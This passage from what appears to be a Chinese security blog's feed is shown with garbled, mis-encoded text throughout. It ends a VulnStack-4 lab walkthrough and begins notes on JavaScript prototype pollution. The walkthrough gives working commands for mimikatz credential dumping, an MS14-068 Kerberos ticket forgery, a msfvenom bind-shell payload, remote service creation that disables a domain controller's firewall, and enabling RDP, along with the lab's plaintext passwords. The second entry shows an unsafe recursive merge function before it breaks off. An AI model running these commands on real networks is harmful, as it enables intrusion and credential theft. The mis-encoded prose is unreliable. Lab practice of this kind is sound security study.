ï¼Œmimikatzè¦æœ‰ç®¡ç†å‘˜æƒé™ä¸ç„¶æ— æ³•æŠ“å–å†…å­˜å¯†ç ï¼Œè¦å…ˆæ¨¡æ‹Ÿä¸ªsystemçš„ä»¤ç‰Œæ‰èƒ½æ‰§è¡ŒæˆåŠŸ</p><pre class="language-shell" data-language="shell"><code class="language-shell">impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span>shellmimikatz.exeprivilege::debug         <span class="token comment"># æƒé™æå‡</span>sekurlsa::logonpasswords <span class="token comment"># æŠ“å–å¯†ç </span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705122131380.png" alt loading="lazy"></p><p>å¾—åˆ°æ˜æ–‡å¯†ç ä¸º<code>Dotest123</code>ï¼Œæ¥ä¸‹æ¥å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ”»å‡»åŸŸæ§</p><p>å°è¯•ç”¨<code>ms17_010</code>æ‰“åŸŸæ§æœº</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705133417461.png" alt loading="lazy"></p><p>åˆ©ç”¨å¤±è´¥</p><h4 id="ms14-068åˆ©ç”¨"><a href="#ms14-068åˆ©ç”¨" class="headerlink" title="ms14-068åˆ©ç”¨"></a>ms14-068åˆ©ç”¨</h4><p>æ¼æ´åˆ©ç”¨å‰æ</p><ol><li>åŸŸæ§æ²¡æœ‰æ‰“MS14-068çš„è¡¥ä¸(KB3011780)</li><li>æ‹¿ä¸‹ä¸€å°åŠ å…¥åŸŸçš„è®¡ç®—æœº</li><li>æœ‰è¿™å°åŸŸå†…è®¡ç®—æœºçš„åŸŸç”¨æˆ·å¯†ç å’Œsid</li></ol><p>ä½¿ç”¨ms14-068ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/WindowsExploits/MS14-068/MS14-068.exe c:<span class="token punctuation">\</span><span class="token punctuation">\</span>users<span class="token punctuation">\</span><span class="token punctuation">\</span>douser</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134119462.png" alt loading="lazy"></p><p>åœ¨win7ä¸Šæ‰§è¡Œä¸‹é¢ä¸€æ¡å‘½ä»¤<br>åŸŸæˆå‘˜<code>sid</code>åœ¨ä¸Šé¢<code>mimikatz</code>ä¸­è·å–åˆ°äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨<code>whoami /user</code> è·å–<code>sid</code></p><pre class="language-shell" data-language="shell"><code class="language-shell">ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d <span class="token number">192.168</span>.183.130 -p Dotest123// ms14-068.exe -u åŸŸæˆå‘˜å@åŸŸå.com -s åŸŸæˆå‘˜sid -d åŸŸæ§åˆ¶å™¨ipåœ°å€ -p åŸŸæˆå‘˜å¯†ç </code></pre><p>æˆåŠŸç”Ÿæˆç¥¨æ®æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134511406.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>mimikatz.exekerberos::purge               <span class="token comment"># æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ </span>kerberos::list                <span class="token comment"># æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯</span>kerberos::ptc TGT_douser@DEMO.com.ccache<span class="token punctuation">(</span>ç”Ÿæˆçš„ç¥¨æ®æ–‡ä»¶<span class="token punctuation">)</span>   <span class="token comment"># å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134918464.png" alt loading="lazy"></p><p>å°è¯•<code>net use</code>ç™»å½•åŸŸæ§</p><pre class="language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token punctuation">\</span>c$</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135037745.png" alt loading="lazy"></p><p>å¦‚ä¸Šå›¾ï¼ŒæˆåŠŸç™»å½•åŸŸæ§å¹¶åˆ—å‡ºäº†åŸŸæ§çš„cç›˜ç›®å½•ã€‚æ­¤æ—¶è¦æƒ³æ§åˆ¶åŸŸæ§æˆ‘ä»¬è¿˜è¦åœ¨Windows 7ä¸Šé¢ä¸Šä¼ ä¸€ä¸ª<strong>æ­£å‘</strong>çš„msfé©¬ã€‚</p><pre class="language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/meterpreter/bind_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.108 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4455</span> -f exe -o bind.exe</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135301027.png" alt loading="lazy"></p><p>ä¼ åˆ°Windows7ä¸Šï¼Œç„¶åç”¨smbæ–‡ä»¶å…±äº«å°†msfé©¬copyåˆ°åŸŸæ§çš„Cç›˜</p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/bind.exe</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135451397.png" alt loading="lazy"></p><p>é€šè¿‡è¿œç¨‹åœ¨åŸŸæ§ä¸Šé¢è®¾ç½®å¥½è®¡åˆ’ä»»åŠ¡</p><pre class="language-shell" data-language="shell"><code class="language-shell">schtasks /create /tn <span class="token string">"test"</span> /tr C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>bind.exe /sc MINUTE /S <span class="token number">192.168</span>.183.130</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135730932.png" alt loading="lazy"></p><p>æ˜¾ç¤º<code>Access is denied</code>ï¼Œç”¨scæœåŠ¡æ¥è¿œç¨‹æ‰§è¡Œï¼Œè®¾ç½®æœåŠ¡æ¥å…³é—­é˜²ç«å¢™</p><pre class="language-shell" data-language="shell"><code class="language-shell">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create unablefirewall <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"netsh advfirewall set allprofiles state off"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start unablefirewall</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140010708.png" alt loading="lazy"></p><p>åˆ›å»ºæœåŠ¡æ‰§è¡Œmsfé©¬ï¼ˆmsfæ­£åœ¨ç›‘å¬ï¼‰</p><pre class="language-shell" data-language="shell"><code class="language-shell">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create bindshell <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"c:<span class="token entity" title="\b">\b</span>ind.exe"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start bindshell</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140424925.png" alt loading="lazy"></p><p>msfé…ç½®</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140300413.png" alt loading="lazy"></p><p>æˆåŠŸä¸Šçº¿åŸŸæ§</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140509486.png" alt loading="lazy"></p><p>ä¸Šä¼ mimikatzæŠ“æ˜æ–‡å¯†ç </p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/mimikatz.exe shellmimikatz.exeprivilege::debugsekurlsa::logonpasswords</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705141108130.png" alt loading="lazy"></p><p>æ‹¿åˆ°åŸŸç®¡ç†å‘˜å¯†ç ä¸º<code>Test2008@!</code></p><h3 id="å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶"><a href="#å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶"></a>å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶</h3><p>æ‹¿ä¸‹åŸŸæ§åï¼Œæˆ‘ä»¬å°±è¦å¯»æ‰¾å¼€å¤´è¯´çš„é‚£ä¸ªåŸŸæ§ä¸­çš„é‡è¦æ–‡ä»¶äº†ã€‚å¼€å¯åŸŸæ§çš„è¿œç¨‹æ¡Œé¢</p><pre class="language-shell" data-language="shell"><code class="language-shell">run post/windows/manage/enable_rdp</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705141301815.png" alt loading="lazy"></p><p>ç™»å½•</p><pre class="language-shell" data-language="shell"><code class="language-shell">proxychains4 rdesktop <span class="token number">192.168</span>.183.130è¾“å…¥è´¦å·å¯†ç ï¼Œè´¦å·ï¼šDEMO<span class="token punctuation">\</span>Administrator å¯†ç ï¼šTest2008@<span class="token operator">!</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706103344426.png" alt loading="lazy"></p><p>ä¼ ä¸ªeverything</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706103708452.png" alt loading="lazy"></p><p>å®‰è£…åå¼€å¯é‡Œé¢çš„httpæœåŠ¡</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706104015740.png" alt loading="lazy"></p><p>kaliæµè§ˆå™¨èµ°ä¸ªä»£ç†ï¼Œsocks5çš„</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706105033678.png" alt loading="lazy"></p><p>éšåå³å¯è®¿é—®æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706105540208.png" alt loading="lazy"></p><p>è‡³äºå•¥æ¼‚äº®å›½æ”»å‡»æˆæƒæŠ¥å‘Šï¼Œé¶æœºä¸Šæ²¡æœ‰è¿™æ–‡ä»¶ï¼Œä¼°è®¡æ˜¯è‡ªå·±åŠ ä¸Šå»çš„ï¼Œä½†ç›®çš„å·²è¾¾æˆï¼Œå¼€æºœ~</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
            <tag> å†…ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptåŸå‹é“¾æ±¡æŸ“æ¼æ´å­¦ä¹ </title>
      <link href="posts/45af3b18/"/>
      <url>posts/45af3b18/</url>
      
        <content type="html"><![CDATA[<p>å­¦ç‚¹æ–°ä¸œè¥¿ï¼ŒJavaScriptç‹¬æœ‰çš„å®‰å…¨é—®é¢˜ï¼ŒJavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œè®°ç¬”è®°</p><span id="more"></span><h3 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h3><p>æ¬å¼ å›¾ï¼Œè½¬è‡ªï¼š<a href="https://www.zhihu.com/question/34183746">https://www.zhihu.com/question/34183746</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605172359234.png" alt loading="lazy"></p><p>JavaScript åªæœ‰ä¸€ç§ç»“æ„ï¼šå¯¹è±¡ã€‚æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆ object ï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <code>__proto__</code> ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<code>prototype</code> ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡( <code>__proto__</code> ) ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚</p><p>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚</p><ul><li>åŸå‹ï¼šåŸå‹æ˜¯Javascriptä¸­ç»§æ‰¿çš„åŸºç¡€,Javascriptçš„ç»§æ‰¿å°±æ˜¯åŸºäºåŸå‹çš„ç»§æ‰¿</li><li>åŸå‹é“¾ï¼šåŸå‹é“¾æ˜¯javascriptçš„å®ç°çš„å½¢å¼,é€’å½’ç»§æ‰¿åŸå‹å¯¹è±¡çš„åŸå‹,åŸå‹é“¾çš„é¡¶ç«¯æ˜¯Objectçš„åŸå‹ã€‚</li></ul><h4 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a>__proto__</h4><p>æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ <code>__proto__</code> å±æ€§ï¼ŒæŒ‡å‘äº†åˆ›å»ºè¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°çš„åŸå‹ã€‚å…¶å®è¿™ä¸ªå±æ€§æŒ‡å‘äº† <code>[[prototype]]</code>ï¼Œä½†æ˜¯ <code>[[prototype]]</code> æ˜¯å†…éƒ¨å±æ€§ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½è®¿é—®åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨ <code>__proto__</code> æ¥è®¿é—®ã€‚</p><h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>æ¯ä¸ªå‡½æ•°éƒ½æœ‰ prototype å±æ€§ï¼Œé™¤äº† <code>Function.prototype.bind()</code>ï¼Œè¯¥å±æ€§æŒ‡å‘åŸå‹ã€‚æ‰€æœ‰çš„ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</p><blockquote><p>éµå¾ªECMAScriptæ ‡å‡†ï¼Œ<code>someObject.[[Prototype]]</code> ç¬¦å·æ˜¯ç”¨äºæŒ‡å‘ <code>someObject</code> çš„åŸå‹ã€‚ä» ECMAScript 6 å¼€å§‹ï¼Œ<code>[[Prototype]]</code> å¯ä»¥é€šè¿‡ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/GetPrototypeOf"><code>Object.getPrototypeOf()</code></a> å’Œ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf"><code>Object.setPrototypeOf()</code></a> è®¿é—®å™¨æ¥è®¿é—®ã€‚è¿™ä¸ªç­‰åŒäº JavaScript çš„éæ ‡å‡†ä½†è®¸å¤šæµè§ˆå™¨å®ç°çš„å±æ€§ <code>__proto__</code>ã€‚</p><p>ä½†å®ƒä¸åº”è¯¥ä¸æ„é€ å‡½æ•° <code>func</code> çš„ <code>prototype</code> å±æ€§ç›¸æ··æ·†ã€‚è¢«æ„é€ å‡½æ•°åˆ›å»ºçš„å®ä¾‹å¯¹è±¡çš„ <code>[[Prototype]]</code> æŒ‡å‘ <code>func</code> çš„ <code>prototype</code> å±æ€§ã€‚<strong><code>Object.prototype</code></strong> å±æ€§è¡¨ç¤º <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> çš„åŸå‹å¯¹è±¡ã€‚</p></blockquote><h3 id="åŸå‹é“¾ç»§æ‰¿"><a href="#åŸå‹é“¾ç»§æ‰¿" class="headerlink" title="åŸå‹é“¾ç»§æ‰¿"></a>åŸå‹é“¾ç»§æ‰¿</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// è®©æˆ‘ä»¬ä»ä¸€ä¸ªå‡½æ•°é‡Œåˆ›å»ºä¸€ä¸ªå¯¹è±¡oï¼Œå®ƒè‡ªèº«æ‹¥æœ‰å±æ€§aå’Œbçš„ï¼š</span><span class="token keyword">let</span> <span class="token function-variable function">f</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* è¿™ä¹ˆå†™ä¹Ÿä¸€æ ·function f() &#123;  this.a = 1;  this.b = 2;&#125;*/</span><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;a: 1, b: 2&#125;</span><span class="token comment">// åœ¨få‡½æ•°çš„åŸå‹ä¸Šå®šä¹‰å±æ€§</span>f<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">// ä¸è¦åœ¨ f å‡½æ•°çš„åŸå‹ä¸Šç›´æ¥å®šä¹‰ f.prototype = &#123;b:3,c:4&#125;;è¿™æ ·ä¼šç›´æ¥æ‰“ç ´åŸå‹é“¾</span><span class="token comment">// o.[[Prototype]] æœ‰å±æ€§ b å’Œ c</span><span class="token comment">//  (å…¶å®å°±æ˜¯ o.__proto__ æˆ–è€… o.constructor.prototype)</span><span class="token comment">// o.[[Prototype]].[[Prototype]] æ˜¯ Object.prototype.</span><span class="token comment">// æœ€åo.[[Prototype]].[[Prototype]].[[Prototype]]æ˜¯null</span><span class="token comment">// è¿™å°±æ˜¯åŸå‹é“¾çš„æœ«å°¾ï¼Œå³ nullï¼Œ</span><span class="token comment">// æ ¹æ®å®šä¹‰ï¼Œnull å°±æ˜¯æ²¡æœ‰ [[Prototype]]ã€‚</span><span class="token comment">// ç»¼ä¸Šï¼Œæ•´ä¸ªåŸå‹é“¾å¦‚ä¸‹:</span><span class="token comment">// &#123;a:1, b:2&#125; ---> &#123;b:3, c:4&#125; ---> Object.prototype---> null</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span class="token comment">// aæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span class="token comment">// bæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 2</span><span class="token comment">// åŸå‹ä¸Šä¹Ÿæœ‰ä¸€ä¸ª'b'å±æ€§ï¼Œä½†æ˜¯å®ƒä¸ä¼šè¢«è®¿é—®åˆ°ã€‚</span><span class="token comment">// è¿™ç§æƒ…å†µè¢«ç§°ä¸º"å±æ€§é®è”½ (property shadowing)"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span><span class="token comment">// cæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span><span class="token comment">// cæ˜¯o.[[Prototype]]çš„å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 4</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span><span class="token comment">// d æ˜¯ o çš„è‡ªèº«å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span><span class="token comment">// d æ˜¯ o.[[Prototype]] çš„å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span><span class="token comment">// o.[[Prototype]].[[Prototype]] ä¸º nullï¼Œåœæ­¢æœç´¢</span><span class="token comment">// æ‰¾ä¸åˆ° d å±æ€§ï¼Œè¿”å› undefined</span></code></pre><p>è°ƒç”¨å¯¹è±¡å±æ€§æ—¶, ä¼šæŸ¥æ‰¾å±æ€§ï¼Œå¦‚æœæœ¬èº«æ²¡æœ‰ï¼Œåˆ™ä¼šå»<code>__proto__</code>ä¸­æŸ¥æ‰¾ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°çš„æ˜¾å¼åŸå‹ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ„é€ å‡½æ•°ä¸­ä¹Ÿæ²¡æœ‰è¯¥å±æ€§ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œä¹Ÿæœ‰<code>__proto__</code>ï¼Œé‚£ä¹ˆä¼šå»<code>__proto__</code>çš„æ˜¾å¼åŸå‹ä¸­æŸ¥æ‰¾ï¼Œä¸€ç›´åˆ°null</p><h3 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h3><p>è¿™é‡Œé‡‡ç”¨PğŸ®çš„ä¾‹å­æ¥ç®€å•åˆ†æä¸€ä¸‹</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span>bar<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token comment">// foo.bar æ­¤æ—¶ä¸º1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span><span class="token comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// æŸ¥çœ‹zoo.bar</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605193352763.png" alt loading="lazy"></p><p>æ ¹æ®ç»“æœæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>zoo.bar</code>æ‰“å°å‡ºæ¥çš„æ˜¯2ï¼Œfooæ˜¯ä¸€ä¸ªobjectå®ä¾‹ï¼Œæˆ‘ä»¬ä»¤<code>foo.__proto__.bar = 2</code>æ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†<code>Object</code>è¿™ä¸ªç±»ï¼Œå¢åŠ äº†ä¸€ä¸ªå±æ€§<code>bar</code>å€¼ä¸º2ï¼Œç„¶åæˆ‘ä»¬æœ‰åˆ›å»ºäº†ä¸€ä¸ªobjectç±»zooï¼Œåˆ™zooå¯¹è±¡è‡ªç„¶æœ‰ä¸€ä¸ªbarå±æ€§</p><blockquote><p>åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p></blockquote><h3 id="åˆ©ç”¨æ‰‹æ®µ"><a href="#åˆ©ç”¨æ‰‹æ®µ" class="headerlink" title="åˆ©ç”¨æ‰‹æ®µ"></a>åˆ©ç”¨æ‰‹æ®µ</h3><ol><li>å¸¸å‘ç”Ÿåœ¨<code>merge</code> ç­‰å¯¹è±¡é€’å½’åˆå¹¶æ“ä½œ</li><li>å¯¹è±¡å…‹éš†</li><li>è·¯å¾„æŸ¥æ‰¾å±æ€§ç„¶åä¿®æ”¹å±æ€§çš„æ—¶å€™</li></ol><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token 